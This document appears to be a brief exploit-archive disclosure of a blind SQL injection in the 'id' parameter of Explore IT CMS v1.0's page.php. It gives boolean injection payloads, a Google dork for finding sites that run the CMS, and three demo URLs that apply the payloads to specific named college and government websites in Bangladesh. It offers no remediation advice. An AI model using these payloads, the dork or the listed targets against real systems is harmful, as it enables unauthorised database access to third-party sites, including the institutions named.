# Explore IT CMS v1.0 has a SQL Injection Vulnerability
Google Dork: "Technical Assistance by: explore IT"

Tested On: Windows 11 + Firefox / Burp Suite

*********************************************************

### Description

Explore IT CMS v1.0 has a blind SQL Injection Vulnerability `id` in page.php with `.php?id=`

[+]:
Vulnerable Parameter:
`id` in URLs with `.php?id=`
Append `' and 1=1--+` and `' and 1=2--+` to the URL and observe the difference in responses.

*********************************************************

### Demo 1:

```
https://kachalonggovtcollege.edu.bd/page.php?id=2  
→ https://kachalonggovtcollege.edu.bd/page.php?id=2'+AND+1=1--+
→ https://kachalonggovtcollege.edu.bd/page.php?id=2'+AND+1=2--+
```

### Demo 2:
```
https://www.rangamaticollege.gov.bd/page.php?id=13  
→ https://www.rangamaticollege.gov.bd/page.php?id=13'+AND+1=1--+
→ https://www.rangamaticollege.gov.bd/page.php?id=13'+AND+1=2--+
```

### Demo 3:
```
https://www.cgsacollege.edu.bd/page.php?id=3  
→ https://www.cgsacollege.edu.bd/page.php?id=3'+AND+1=1--+
→ https://www.cgsacollege.edu.bd/page.php?id=3'+AND+1=2--+
```



*********************************************************

[+] Google Dork:
"Technical Assistance by: explore IT"

*********************************************************